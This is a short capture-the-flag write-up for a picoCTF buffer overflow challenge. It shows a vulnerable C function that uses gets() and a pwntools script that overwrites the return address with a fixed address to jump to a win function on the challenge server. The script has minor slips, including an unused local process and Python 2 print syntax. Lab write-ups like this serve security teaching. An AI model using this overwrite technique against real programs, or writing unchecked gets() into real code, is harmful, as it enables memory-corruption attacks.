# Description

Control the return address

```c
// vulnerable function
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
We can just easily overwrite the eip to execute the function function win

```python
from pwn import *

p = process('./buffer_overflow1')
r = remote('saturn.picoctf.net', 65160)
r.recvuntil('Please enter your string:')

payload = cyclic(44)
payload += p32(0x080491f6)

r.sendline(payload)
print r.recvall()
```
